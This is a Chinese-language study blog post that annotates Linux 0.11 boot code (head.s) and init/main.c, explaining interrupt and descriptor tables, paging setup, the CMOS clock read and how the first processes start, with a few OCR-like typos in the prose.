check_x87: fninit # 向协处理器发出初始化指令 fstsw %ax # 将协处理器状态字复制给ax cmpb $0,%al\t# 初始化后状态字应该位0，否则协处理器不存在 je 1f\t/* no coprocessor: have to set bits */ #跳转到标号位1处(前面) movl %cr0,%eax # 如果存在则跳到标号位1处，否则改写cr0 xorl $6,%eax\t/* reset MP, set EM */ ;设置协处理器仿真位(EM) movl %eax,%cr0 ret # .align 是汇编语言指示符，用于存储边界对齐调整 # 2表示把随后的代码和数据的偏移位置调整到地址值最后2比特位为0的位置(2*2) # 即按四字节方式对齐内存地址 # 使用该指示符目的是为了提高32位cpu访问内存中代码或数据的速度和效率 .align 2 # 287协处理码，将80287设置为保护模式 1:\t.byte 0xDB,0xE4\t/* fsetpm for 287, ignored by 387 */ ret /* * setup_idt * * sets up a idt with 256 entries pointing to * ignore_int, interrupt gates. It then loads * idt. Everything that wants to install itself * in the idt-table may do so themselves. Interrupts * are enabled elsewhere, when we can be relatively * sure everything is ok. This routine will be over- * written by the page tables. */ ;设置中断描述符表(IDT)字程序setup_idt ; 将中断描述符表设置具有256个项，并都指向ignore_int中断门，然后加载中断描述符表寄存器 ; 中断描述符表中的项为8个字节，称为门描述符 setup_idt: lea ignore_int,%edx # 将ignore_int有效地址值赋值给edx movl $0x00080000,%eax # 将选择符0x0008赋值给eax的高16位 movw %dx,%ax\t/* selector = 0x0008 = cs */ movw $0x8E00,%dx\t/* interrupt gate - dpl=0, present */ lea _idt,%edi # _idt 是中断描述符表的地址 mov $256,%ecx rp_sidt: movl %eax,(%edi)\t# eax -\u0026gt; [edi] 将哑中断门描述符存入表中 movl %edx,4(%edi) # edx -\u0026gt; [edi+4] addl $8,%edi\t# edi + 8 -\u0026gt; edi dec %ecx jne rp_sidt lidt idt_descr #加载中断描述符表寄存器 ret /* * setup_gdt * * This routines sets up a new gdt and loads it. * Only two entries are currently built, the same * ones that were built in init.s. The routine * is VERY complicated at two whole lines, so this * rather long comment is certainly needed :-). * This routine will beoverwritten by the page tables. */ # 设置全局描述符表项 setup_gdt: lgdt gdt_descr # 加载全局描述符寄存器 ret /* * I put the kernel page tables right after the page directory, * using 4 of them to span 16 Mb of physical memory. People with * more than 16MB will have to expand this. */ # 将内核的内存页表直接放在页目录后，使用4个表来寻址16MB的物理地址 .org 0x1000 # 从偏移地址0x1000处开始是第一个页表(偏移0开始将存放页表目录) pg0: .org 0x2000 pg1: .org 0x3000 pg2: .org 0x4000 pg3: .org 0x5000 # 定义下面的内存数据从偏移地址0x5000开始 /* * tmp_floppy_area is used by the floppy-driver when DMA cannot * reach to a buffer-block. It needs to be aligned, so that it isn\u0026#39;t * on a 64kB border. */ # 当DMA(直接存储器访问)不能访问缓冲块时，则_tmp_floppy_area内存块就可以供软盘驱动程序使用 # 需要保证地址对齐 _tmp_floppy_area: .fill 1024,1,0 # 保留1024项，每一项一个字节，填充数值为0 # 下面几个入栈操作为了跳转到init/main.c中main()函数做准备 # 前面三个入栈0值分别表示envp,argv指针和argc的值 after_page_tables: pushl $0\t# These are the parameters to main :-) main函数参数 envp pushl $0\t# argv指针 pushl $0\t# argc pushl $L6\t# return address for main, if it decides to. 模拟调用main时首先将返回地址入栈的操作 pushl $_main # _main---\u0026gt;main jmp setup_paging # main函数到不了这里 ，到标号L6这里，是一个死循环 L6: jmp L6\t# main should never return here, but # just in case, we know what happens. /* This is the default interrupt \u0026#34;handler\u0026#34; :-) */ # 下面是默认的中断\u0026#39;向量句柄\u0026#39;\u0026#39; int_msg: .asciz \u0026#34;Unknown interruptnr\u0026#34; # 定义‘未知的指定’ .align 2 # 按4字节方式对齐内存地址 # 中断处理过程 ignore_int: pushl %eax pushl %ecx pushl %edx push %ds # 这里请注意ds，es，fs，gs等虽然是16位的寄存器 push %es # 但仍然会以32位的形式入栈，即需要占用4个字节的栈空间 push %fs # 以上用于保存寄存器 movl $0x10,%eax mov %ax,%ds mov %ax,%es mov %ax,%fs pushl $int_msg call _printk # 该函数在 kernel/printk.c 中 popl %eax # 清理参数 pop %fs pop %es pop %ds popl %edx popl %ecx popl %eax iret # 中断返回(把中断调用是压入栈的CPU标志寄存器值也弹出) /* * Setup_paging * * This routine sets up paging by setting the page bit * in cr0. The page tables are set up, identity-mapping * the first 16MB. The pager assumes that no illegal * addresses are produced (ie \u0026gt;4Mb on a 4Mb machine). * * NOTE! Although all physical memory should be identity * mapped by this routine, only the kernel page functions * use the \u0026gt;1Mb addresses directly. All \u0026#34;normal\u0026#34; functions * use just the lower 1Mb, or the local data space, which * will be mapped to some other place - mm keeps track of * that. * * For those with more memory than 16 Mb - tough luck. I\u0026#39;ve * not got it, why should you :-) The source is here. Change * it. (Seriously - it shouldn\u0026#39;t be too difficult. Mostly * change some constants etc. I left it at 16Mb, as my machine * even cannot be extended past that (ok, but it was cheap :-) * I\u0026#39;ve tried to show which constants to change by having * some kind of marker at them (search for \u0026#34;16Mb\u0026#34;), but I * won\u0026#39;t guarantee that\u0026#39;s all :-( ) */ # 下面这段子程序通过控制CR0的标志位(PG位31)来启动对内存的分页处理功能，并设置各个表项的内容\t.align 2 # 按4字节方式对齐内存地址边界 setup_paging: movl $1024*5,%ecx\t/* 5 pages - pg_dir+4 page tables */#对(1页目录+4页页表)清零 xorl %eax,%eax xorl %edi,%edi\t/* pg_dir is at 0x000 */ #目录页从0x00开始 cld;rep;stosl # 设置页目录表中的项，内核中有4个页表需要设置4项 movl $pg0+7,_pg_dir\t/* set present bit/user r/w */# pg0+7：0x000010007,页目录表中的第一项 movl $pg1+7,_pg_dir+4\t/* --------- \u0026#34; \u0026#34; --------- */ movl $pg2+7,_pg_dir+8\t/* --------- \u0026#34; \u0026#34; --------- */ movl $pg3+7,_pg_dir+12\t/* --------- \u0026#34; \u0026#34; --------- */ # 填写4个页表中所有内容：4(页表)*1024(项)=4096(项) movl $pg3+4092,%edi movl $0xfff007,%eax\t/* 16Mb - 4096 + 7 (r/w user,p) */ std 1:\tstosl\t/* fill pages backwards - more efficient :-) */ subl $0x1000,%eax jge 1b # 设置页目录表基址寄存器CR3的值(保存的页目录表的物理地址)，指向页目录表， xorl %eax,%eax\t/* pg_dir is at 0x0000 */ movl %eax,%cr3\t/* cr3 - page directory start */ movl %cr0,%eax # 设置启用分页处理，(cr0的标志PG,位31) orl $0x80000000,%eax movl %eax,%cr0\t/* set paging (PG) bit */ ret\t/* this also flushes prefetch-queue */ # 在改变分页处理标志后要求使用转移指令刷新预取指令队列，这里用的是返回指令ret # 返回指令的作用将main程序压入栈中的地址弹出，并转到init/main.c去运行 .align 2 .word 0 # 加载中断描述符表寄存器idtr的lidt指令 idt_descr: .word 256*8-1\t# idt contains 256 entries .long _idt .align 2 .word 0 # 加载全局描述符表寄存器gdtr的lgdt指令 gdt_descr: .word 256*8-1\t# so does gdt (not that that\u0026#39;s any .long _gdt\t# magic number, but it works for me :^) .align 3 _idt:\t.fill 256,8,0\t# idt is uninitialized # 全局表，前4项是空项，代码段描述符，数据段描述符，系统调用段描述符 _gdt:\t.quad 0x0000000000000000\t/* NULL descriptor */ .quad 0x00c09a0000000fff\t/* 16Mb */ .quad 0x00c0920000000fff\t/* 16Mb */ .quad 0x0000000000000000\t/* TEMPORARY - don\u0026#39;t use */ .fill 252,8,0\t/* space for LDT\u0026#39;s and TSS\u0026#39;s etc */ 初始化程序\u0026mdash;main(1) (1)小结 1.bootsect.s程序的主要功能：将setup.s和system模块加载到内存中，并且将自身移动到0x90000处，然后控制权交给setup.s程序\n2.setup程序：利用BIOS获取硬件参数并保存（main.c会用到的）；将system移动到0x00000；描述符表寄存器设置；硬件中断设置；设置CR0进入32位保护模式，控制权交给head.s\n3.head.s程序：初步初始化中断描述符表项（哑中断）；检查A20；测试是否有协处理器；初始化内存页目录表；跳转到main.c执行内核初始化\n(2)功能描述 系统执行完boot/head.s程序就会将执行权交给main.c\nmain.c首先利用setup.s取得的系统参数设置系统的根文件设备号以及一些内存全局变量，这些变量指明了主内存的开始地址，系统所拥有的内存容量和作为高速缓存区的末端地址。若定义了虚拟盘，则主内存将适当减少\n如同系统功能\n高速缓冲区还要扣除被显存和ROM BIOS占用的部分。\n高速缓存区是用于磁盘等块设备临时存放数据的地方，以1k字节为数据块单位。\n主内存区的内存由内存管理模块mm通过分页机制进行管理分配，以4k字节为一个内存页单位\n内核程序可以自由访问高速缓冲区的数据，但需要通过mm才能使用分配到的内存页面\n内核进行所有的方面的硬件初始化工作。包括陷阱门，块设备，字符设备，tty，还包括人工设置的第一个任务（task 0).\n所有的初始化工作完成后程序就设置中断允许标志以开启中断，并切换到任务0中允许。\n在整个内核初始化完成后，内核将执行权切换到用户模式（任务0），\nCPU从0特权级切换到了第3个特权级，然后此时main函数工作就在任务0中，最后系统第一次调用进程创建函数fork()，创建出一个用于运行init() 的子进程（init进程）\n内核初始化流程\n1.main.c程序首先确定如何分配使用系统物理内存，然后调用内核各部分的初始化函数分别对内存管理、中断处理、块设备和字符设备、进程管理以及硬盘和软盘硬件进行初始化处理。在完成了这些操作之后，系统各部分已经处于可运行状态。此后程序把自己“手工”移动到任务0（进程0）中运行，并使用fork/调用首次创建出进程1（inti进程），并在其中调用min()函数。在该函数中程序将继续进行应用环境的初始化并执行shell登录程序。而原进程0则会在系统空闲时被调度执行，因此进程0通常也被称为idle进程。此时进程0仅执行pause()系统调用，并又会调用调度函数。\n2.init 函数的功能可分为4个部分：\n①安装根文件系统；\n②显示系统信息；\n③运行系统初始资源配置文件re中的命令；\n④执行用户登录shell程序。\n3.代码首先调用系统调用setup()，用来收集硬盘设备分区表信息并安装根文件系统。在安装根文件系统之前，系统会先判断是否需要先建立虚拟盘。若编译内核时设置了虚拟盘的大小，并在前面内核初始化过程中已经开辟了一块内存用作虚拟盘，则内核就会首先尝试把根文件系统加载到内存的虚拟盘区中。\n4.然后inii打开一个终端设备tty0，并复制其文件描述符以产生标准输入stdin、标准输出stdout和错误输出water设备。内核随后利用这些描述符在终端上显示一些系统信息，例如高速缓冲区中缓冲块总数、主内存区空闲内存总字节数等。\n5.接着init又新建了一个进程(进程2)，并在其中为建立用户交互使用环境而执行一些初始配置操作，即在用户可以使用shell命令行环境之前，内核调用/bin/sh程序运行了配置文件etc中设置的命令。文件的作用与DOS系统根目录上的AUTOEXEC.BAT文件类似。这段代码首先通过关闭文件描述符D，并立刻打开文件/te陵rù，从而把标准输入stdm定向到etc/re文件上。这样，所有的标准输入数据都将从该文件中读取。然后内核以非交互形式执行/bin/sh，从而实现执行/etc.re文件中的命令。当该文件中的命令执行完毕后，/bin/sh就会立刻退出。因此进程2也就随之结束。\n6.init函数的最后一部份用于在新建进程中为用户建立一个新的会话，并运行用户登录shell程序，/bin/sh。在系统执行进程2中的程序时，父进程(mit进程)一直等待着它的结束。随着进程2的退出，父进程就进入到一个无限循环中。在该循环中，父进程会再次生成一个新进程，然后在该进程中创建一个新的会话，并以登录shell方式再次执行程序/bin/sh，以创建用户交互shell环境。然后父进程继续等待该子进程。登录shell虽然与前面的非交互式shell是同一个程序/bin/sh，但是所使用的命令行参数( argV[ ])不同。登录shell的第0个命令行参数的第1个字符一定是一个减号比。这个特定的标志会在/bin/sh执行时通知它这不是一次普通的运行，而是作为登录shell运行bin/sh的。从这时开始，用户就可以正常使用Linux命令行环境了，而父进程随之又进入等待状态。此后若用户在命令行上执行了exit或Ilogount命令，那么在显示一条当前登录shell退出的信息后，系统就会在这个无限循环中再次重复以上创建登录shell进程的过程。\n7.任务1中运行的init()函数的后两部分实际上应该是独立的环境初始化程序mit等的功能。\n3.内联函数\n由于创建新进程是通过完全复制父进程的代码段和数据段，因此在首次使用fork()创建进程的时候，为了确保新进程 用户态栈中没有进程0的多余信息，要求进程0在创建首个新进程(进程1)之前，不要使用其用户态栈，即要求任务0不要调用函数。\n所以在main程序移动到任务0执行后，任务0中的代码fork()不能以函数形式进行调用，从而引入了gcc函数内嵌形式来执行这个系统调用。\nstatic inline _syscall0(int ,fork) —\u0026gt;内联函数 通过声明一个内联函数，可以让gcc把函数的代码集成调用到它的代码中 省去函数调用的内存，提高代码执行速度 注;这里的0表示后面为参数，若有一个参数则是_syscall1\n-syscall0()是unistd.h中内嵌宏代码，以嵌入式汇编形式调用Linux的系统调用中断 int 0x80，也即是int fork()创建进程系统调用\ngcc语法文章详情：\n添加链接描述\n1 2 3 4 5 6 7 8 9 10 11 12 #define _syscall0(type,name) type name(void) { long __res; // 声明一个寄存器 __asm__ volatile (\u0026#34;int $0x80\u0026#34; //调用系统中断 0x80 : \u0026#34;=a\u0026#34; (__res) //将返回值--\u0026gt;eax(_res) 输出寄存器 : \u0026#34;0\u0026#34; (__NR_##name)); //输入为系统中断调用号_NR_name 输入寄存器 if (__res \u0026gt;= 0) return (type) __res; errno = -__res; return -1; } (4)CMOS PC机的CMOS内存大小为128或者64字节内存块，是系统实时时钟芯片RTC的一部分，保存时间和日期信息，存放的格式是BCD码\n要访问CMOS需要通过端口0x70(地址端口)，0x71(数据端口)\nCMOS64字节信息：\n初始化程序\u0026mdash;main(2) 一、源码分析 系统初始化程序init/main.c主要功能是对系统进行初始化，并切换到用户模式下执行登录程序\n(1)库文件介绍\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // 宏定义__LIBRARY__为了包括在unistd.h中内嵌汇编代码 #define __LIBRARY__ // *.h所在头文件默认目录在include/ // unistd.h是标准符号常数与类型文件，定义了各种符号常数和类型，并声明了各种函数 // 若定义了_LIBRARY_,则还会包含系统调用号和内嵌汇编代码如syscall0 #include \u0026lt;unistd.h\u0026gt; // 时间类型头文件，定义了tm结构和关于时间的函数原型 #include \u0026lt;time.h\u0026gt; #include \u0026lt;linux/tty.h\u0026gt; //定义了tty_io,串口通信方面的参数，常数 #include \u0026lt;linux/sched.h\u0026gt; //调度，定义了任务结构体task_struct,第一个初始任务的数据 #include \u0026lt;linux/head.h\u0026gt; //定义了段描述符的简单结构和几个选择符常量 #include \u0026lt;asm/system.h\u0026gt; //以宏的形式定义了有关描述符参数设置或修改描述符，中断门等汇编程序 #include \u0026lt;asm/io.h\u0026gt; //以嵌入式汇编程序形式定义了对io端操作的函数 #include \u0026lt;stddef.h\u0026gt; //标准定义头文件，定义了NULL,TYPE,MEMBER #include \u0026lt;stdarg.h\u0026gt;\t//标志参数头文件，以宏的形式定义了变量参数列表 //一个类型：va_list,三个宏：va_start,va_arg,va_end //vsprintf,vprintf,vfprintf #include \u0026lt;unistd.h\u0026gt;\t//标准符号常数与类型文件，定义了各种符号常数和类型，并声明了各种函数 #include \u0026lt;fcntl.h\u0026gt; //文件控制头文件，用于文件及其描述符的操作控制常数符号的定义\t#include \u0026lt;sys/types.h\u0026gt; //类型头文件，定义了基本的系统数据类型 #include \u0026lt;linux/fs.h\u0026gt; //文件系统头文件，定义了文件表结构(file,buffer_head,m_inode) (2)CMOS读取时间\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 //读取CMOS实时时钟信息 //outb_p端口输出宏定义，inb_p端口输入宏定义 //0x70是写地址端口号 0x80|addr是要读取CMOS内存地址，0x71是度数据端口号 #define CMOS_READ(addr) ({ outb_p(0x80|addr,0x70); inb_p(0x71); }) //将BCD码转化为二进制数值 //(val)\u0026amp;15取BCD码第四位也就是个位，val)\u0026gt;\u0026gt;4右移四位只剩高四位也就是十位 #define BCD_TO_BIN(val) ((val)=((val)\u0026amp;15) + ((val)\u0026gt;\u0026gt;4)*10) //该函数取CMOS实时中信息作为开机时间，并保存到全局变量startup_time static void time_init(void) { struct tm time; //时间结构体 do { //从CMOS内存列表中读取时间 time.tm_sec = CMOS_READ(0); //秒值(BCD码形式) time.tm_min = CMOS_READ(2); time.tm_hour = CMOS_READ(4); time.tm_mday = CMOS_READ(7); time.tm_mon = CMOS_READ(8); time.tm_year = CMOS_READ(9); } while (time.tm_sec != CMOS_READ(0)); BCD_TO_BIN(time.tm_sec); //转换位2进制数值 BCD_TO_BIN(time.tm_min); BCD_TO_BIN(time.tm_hour); BCD_TO_BIN(time.tm_mday); BCD_TO_BIN(time.tm_mon); BCD_TO_BIN(time.tm_year); time.tm_mon--; startup_time = kernel_mktime(\u0026amp;time); //计算开机时间 } (3)内核所有初始化\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 //内核进行所有方面的初始化 mem_init(main_memory_start,memory_end); //主内存区初始 trap_init(); //陷阱门(硬件中断向量)初始化 blk_dev_init(); //块设备初始化 chr_dev_init(); //字符设备初始化 tty_init(); //tty初始化 time_init(); //设置开机启动时间 sched_init(); //调度程序初始化(加载任务0的tr,ldtr) buffer_init(buffer_memory_end); //缓冲管理初始化，建内存链表 hd_init(); //硬盘初始化 floppy_init(); //软盘初始化 sti(); //所有初始化完成，开启中断 //下面过程通过在堆栈中设置的参数，利用中断返回指令启动任务0执行 move_to_user_mode(); //切换到用户模式 (4)切换到用户模式\n1 2 3 4 5 //下面过程通过在堆栈中设置的参数，利用中断返回指令启动任务0执行 move_to_user_mode(); //切换到用户模式 if (!fork()) {\t/* we count on this going ok */ init(); //在新建的子进程中运行 } 二、完整源码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 /* * linux/init/main.c * * (C) 1991 Linus Torvalds */ // 宏定义__LIBRARY__为了包括在unistd.h中内嵌汇编代码 #define __LIBRARY__ // *.h所在头文件默认目录在include/ // unistd.h是标准符号常数与类型文件，定义了各种符号常数和类型，并声明了各种函数 // 若定义了_LIBRARY_,则还会包含系统调用号和内嵌汇编代码如syscall0 #include \u0026lt;unistd.h\u0026gt; // 时间类型头文件，定义了tm结构和关于时间的函数原型 #include \u0026lt;time.h\u0026gt; /* * we need this inline - forking from kernel space will result * in NO COPY ON WRITE (!!!), until an execve is executed. This * is no problem, but for the stack. This is handled by not letting * main() use the stack at all after fork(). Thus, no function * calls - which means inline code for fork too, as otherwise we * would use the stack upon exit from \u0026#39;fork()\u0026#39;. * * Actually only pause and fork are needed inline, so that there * won\u0026#39;t be any messing with the stack from main(), but we define * some others too. */ /* 在内核空间创建进程将会导致没有写时复制， 为了保证不使用任务0的用户栈： main在移动到用户模式(到任务0)后执行内嵌方式的fork()和pause() 在执行move_to_user_mode()后，main就以任务0的方式运行 任务0是所有子进程的父进程 当它创建子进程时，由于任务1属于内核空间，无写时复制 任务0的用户空栈就是任务1的用户栈，即他们共用一个栈空间 因此在运行任务0时不要对堆栈有任何的操作 但在再次执行fork()并执行过execve()后,被加载的程序也不属于内核空间 */ // 定义内联函数 static inline _syscall0(int,fork) // 实际上是 int fork()创建进程系统调用 static inline _syscall0(int,pause) //int pause()系统调用 ：暂停进程的执行，直到收到一个信息 static inline _syscall1(int,setup,void *,BIOS) // int setup(void *,BIOS)系统调用 用于linux初始化 static inline _syscall0(int,sync) // int sync()系统调用：更新文件系统 #include \u0026lt;linux/tty.h\u0026gt; //定义了tty_io,串口通信方面的参数，常数 #include \u0026lt;linux/sched.h\u0026gt; //调度，定义了任务结构体task_struct,第一个初始任务的数据 #include \u0026lt;linux/head.h\u0026gt; //定义了段描述符的简单结构和几个选择符常量 #include \u0026lt;asm/system.h\u0026gt; //以宏的形式定义了有关描述符参数设置或修改描述符，中断门等汇编程序 #include \u0026lt;asm/io.h\u0026gt; //以嵌入式汇编程序形式定义了对io端操作的函数 #include \u0026lt;stddef.h\u0026gt; //标准定义头文件，定义了NULL,TYPE,MEMBER #include \u0026lt;stdarg.h\u0026gt;\t//标志参数头文件，以宏的形式定义了变量参数列表 //一个类型：va_list,三个宏：va_start,va_arg,va_end //vsprintf,vprintf,vfprintf #include \u0026lt;unistd.h\u0026gt;\t//标准符号常数与类型文件，定义了各种符号常数和类型，并声明了各种函数 #include \u0026lt;fcntl.h\u0026gt; //文件控制头文件，用于文件及其描述符的操作控制常数符号的定义\t#include \u0026lt;sys/types.h\u0026gt; //类型头文件，定义了基本的系统数据类型 #include \u0026lt;linux/fs.h\u0026gt; //文件系统头文件，定义了文件表结构(file,buffer_head,m_inode) static char printbuf[1024]; //静态字符串数组，用作内核显示信息的缓存 extern int vsprintf(); //格式化输出到一字符串中 extern void init(void); //初始化 extern void blk_dev_init(void);//块设备初始化 extern void chr_dev_init(void);//字符设备初始化 extern void hd_init(void);\t//硬盘初始化 extern void floppy_init(void); //软驱初始化 extern void mem_init(long start, long end); //内存管理初始化 extern long rd_init(long mem_start, int length); //虚拟盘初始化 extern long kernel_mktime(struct tm * tm); //计算系统开机启动时间(s) extern long startup_time; //内核启动时间(s) /* * This is set up by the setup-routine at boot-time */ //这些数据在内核引导期间由setup设置 //将指定的线性地址强行转换为给的数据类型的指针，并获取指针所指的内容 #define EXT_MEM_K (*(unsigned short *)0x90002) //1MB以后的扩展内容大小 #define DRIVE_INFO (*(struct drive_info *)0x90080) //硬盘参数表的32字节内容 #define ORIG_ROOT_DEV (*(unsigned short *)0x901FC) //根文件系统所在设备号 /* * Yeah, yeah, it\u0026#39;s ugly, but I cannot find how to do this correctly * and this seems to work. I anybody has more info on the real-time * clock I\u0026#39;d be interested. Most of this was trial and error, and some * bios-listing reading. Urghh. */ //读取CMOS实时时钟信息 //outb_p端口输出宏定义，inb_p端口输入宏定义 //0x70是写地址端口号 0x80|addr是要读取CMOS内存地址，0x71是度数据端口号 #define CMOS_READ(addr) ({ outb_p(0x80|addr,0x70); inb_p(0x71); }) //将BCD码转化为二进制数值 //(val)\u0026amp;15取BCD码第四位也就是个位，val)\u0026gt;\u0026gt;4右移四位只剩高四位也就是十位 #define BCD_TO_BIN(val) ((val)=((val)\u0026amp;15) + ((val)\u0026gt;\u0026gt;4)*10) //该函数取CMOS实时中信息作为开机时间，并保存到全局变量startup_time static void time_init(void) { struct tm time; //时间结构体 do { //从CMOS内存列表中读取时间 time.tm_sec = CMOS_READ(0); //秒值(BCD码形式) time.tm_min = CMOS_READ(2); time.tm_hour = CMOS_READ(4); time.tm_mday = CMOS_READ(7); time.tm_mon = CMOS_READ(8); time.tm_year = CMOS_READ(9); } while (time.tm_sec != CMOS_READ(0)); BCD_TO_BIN(time.tm_sec); //转换位2进制数值 BCD_TO_BIN(time.tm_min); BCD_TO_BIN(time.tm_hour); BCD_TO_BIN(time.tm_mday); BCD_TO_BIN(time.tm_mon); BCD_TO_BIN(time.tm_year); time.tm_mon--; startup_time = kernel_mktime(\u0026amp;time); //计算开机时间 } static long memory_end = 0; //机器具有的物理内存容量 static long buffer_memory_end = 0; //高速缓冲区末端地址 static long main_memory_start = 0; //主内存(将用于分页)开始的位置 struct drive_info { char dummy[32]; } drive_info; //用于存放硬盘参数表信息 //内核初始化主程序，初始化结束以后将以任务0(idle任务位空闲任务)的身份运行 void main(void)\t/* This really IS void, no error here. */ {\t/* The startup routine assumes (well, ...) this */ /* * Interrupts are still disabled. Do necessary setups, then * enable them */ //此时中断被关闭，做完必要的设置后就将其开启 ROOT_DEV = ORIG_ROOT_DEV; //保存根设备号 --\u0026gt;ROOT_DEV drive_info = DRIVE_INFO; //保存0x90080磁盘参数表内容 memory_end = (1\u0026lt;\u0026lt;20) + (EXT_MEM_K\u0026lt;\u0026lt;10); //机器内存数---\u0026gt;memory_end ,内存大小=1MB+扩展内存(k)*1024字节 memory_end \u0026amp;= 0xfffff000; //忽略不到4kb(1页)的内存数 if (memory_end \u0026gt; 16*1024*1024) //大于16MB 则等于16MB memory_end = 16*1024*1024; if (memory_end \u0026gt; 12*1024*1024) //内存\u0026gt;12MB,高速缓冲末端=4mb buffer_memory_end = 4*1024*1024; //高速缓冲末端地址---\u0026gt;buffer_memory_end else if (memory_end \u0026gt; 6*1024*1024) //内存\u0026gt;6MB,高速缓冲末端=4mb buffer_memory_end = 2*1024*1024; else //否则高速缓冲末端=1mb buffer_memory_end = 1*1024*1024; main_memory_start = buffer_memory_end; //主内存开始地址=高速缓冲末端 //如果在Makefile中定义了内存虚拟盘符号RAMDISK，则初始化虚拟盘(主内存减少) #ifdef RAMDISK main_memory_start += rd_init(main_memory_start, RAMDISK*1024); #endif //内核进行所有方面的初始化 mem_init(main_memory_start,memory_end); //主内存区初始 trap_init(); //陷阱门(硬件中断向量)初始化 blk_dev_init(); //块设备初始化 chr_dev_init(); //字符设备初始化 tty_init(); //tty初始化 time_init(); //设置开机启动时间 sched_init(); //调度程序初始化(加载任务0的tr,ldtr) buffer_init(buffer_memory_end); //缓冲管理初始化，建内存链表 hd_init(); //硬盘初始化 floppy_init(); //软盘初始化 sti(); //所有初始化完成，开启中断 //下面过程通过在堆栈中设置的参数，利用中断返回指令启动任务0执行 move_to_user_mode(); //切换到用户模式 if (!fork()) {\t/* we count on this going ok */ init(); //在新建的子进程中运行 } /* * NOTE!! For any other task \u0026#39;pause()\u0026#39; would mean we have to get a * signal to awaken, but task0 is the sole exception (see \u0026#39;schedule()\u0026#39;) * as task 0 gets activated at every idle moment (when no other tasks * can run). For task0 \u0026#39;pause()\u0026#39; just means we go check if some other * task can run, and if not we return here. */ //运行任务0 //pause()系统调用会把任务0转换成可中断等待状态，再执行调度函数 //若调度函数发现系统中没有没有其他任务可以运行就会切换到任务0，而不依赖任务0的状态\tfor(;;) pause(); } //printf()产生格式化信息输出到标准设备stdout(1),在屏幕上显示 // 参数fmt：指定输出将采用的格式 static int printf(const char *fmt, ...) { va_list args; int i; va_start(args, fmt); write(1,printbuf,i=vsprintf(printbuf, fmt, args)); va_end(args); return i; } //读取并执行/etc/rc文件所使用的命令行参数和环境参数 static char * argv_rc[] = { \u0026#34;/bin/sh\u0026#34;, NULL }; static char * envp_rc[] = { \u0026#34;HOME=/\u0026#34;, NULL }; //运行登录shell时所使用的命令行参数和环境参数 static char * argv[] = { \u0026#34;-/bin/sh\u0026#34;,NULL }; static char * envp[] = { \u0026#34;HOME=/usr/root\u0026#34;, NULL }; //在main()中进行了系统初始化，包括内存管理，各种硬件设备和驱动设备 //而init()运行在任务0第一次创建的子进程，对第一个要执行的shell程序的环境进行初始化 //然后以登录shell方式加载该程序并执行 void init(void) { int pid,i; //setup()用于读取硬盘参数包含分区表信息并加载虚拟信息和安装根文件系统设备 setup((void *) \u0026amp;drive_info); (void) open(\u0026#34;/dev/tty0\u0026#34;,O_RDWR,0); //终端控制台 (void) dup(0); (void) dup(0); //打印缓冲区块数和总字节数，每块1024字节，以及主内存区空闲内存字节数 printf(\u0026#34;%d buffers = %d bytes buffer spacenr\u0026#34;,NR_BUFFERS, NR_BUFFERS*BLOCK_SIZE); printf(\u0026#34;Free mem: %d bytesnr\u0026#34;,memory_end-main_memory_start); //创建一个子进程(任务2) --\u0026gt;返回值为 =0,父进程--\u0026gt;返回值 = 子进程pid //创建失败 if (!(pid=fork())) { close(0); if (open(\u0026#34;/etc/rc\u0026#34;,O_RDONLY,0)) _exit(1); execve(\u0026#34;/bin/sh\u0026#34;,argv_rc,envp_rc); _exit(2); } //父进程 if (pid\u0026gt;0) while (pid != wait(\u0026amp;i)) //等待子进程结束。\u0026amp;i存放返回状态信息的位置 /* nothing */; //上一个进程结束，下面循环在创建一个子进程 while (1) { //创建失败 if ((pid=fork())\u0026lt;0) { printf(\u0026#34;Fork failed in initrn\u0026#34;); continue; } //新的子进程 if (!pid) { close(0);close(1);close(2); setsid(); //创新会话期 (void) open(\u0026#34;/dev/tty0\u0026#34;,O_RDWR,0); (void) dup(0); (void) dup(0); _exit(execve(\u0026#34;/bin/sh\u0026#34;,argv,envp)); } while (1) if (pid == wait(\u0026amp;i)) break; printf(\u0026#34;nrchild %d died with code %04xnr\u0026#34;,pid,i); sync(); //同步操作，刷新缓冲区 } _exit(0);\t/* NOTE! _exit, not exit() */ //_exit() 终止一个函数属于sys_exit系统调用 //exit() 终止一个函数，属于库函数，它会先执行一些清除操作，然后调用_exit() } ","permalink":"https://chance7bin.github.io/posts/basic/os/%E4%B8%80%E5%86%85%E6%A0%B8%E5%90%AF%E5%8A%A8/","summary":"引导启动程序\u0026mdash;bootsect 1.简介 冯·诺依曼存储程序思想 存储程序的主要思想：将程序和数据存放到计算机内部的存储器中，计算机在","title":"一、内核启动"},{"content":"写在前面 该篇博客是我在看《图解HTTP》这本书时记录的学习笔记✍~~\n第 1 章 了解 Web 及网络基础 Web 使用一种名为 ==HTTP（HyperText Transfer Protocol，超文本传输协议）==的协议作为规范，完成从客户端到服务器端等一系列运作流程。而协议是指规则的约定。可以说，Web 是建立在 HTTP 协议上通信的。\nTCP/IP 的分层管理 TCP/IP 协议族里重要的一点就是分层。TCP/IP 协议族按层次分别分为以下 4 层：==应用层、传输层、网络层和数据链路层==。\n应用层\n应用层决定了向用户提供应用服务时通信的活动。\nTCP/IP 协议族内预存了各类通用的应用服务。比如，FTP（File Transfer 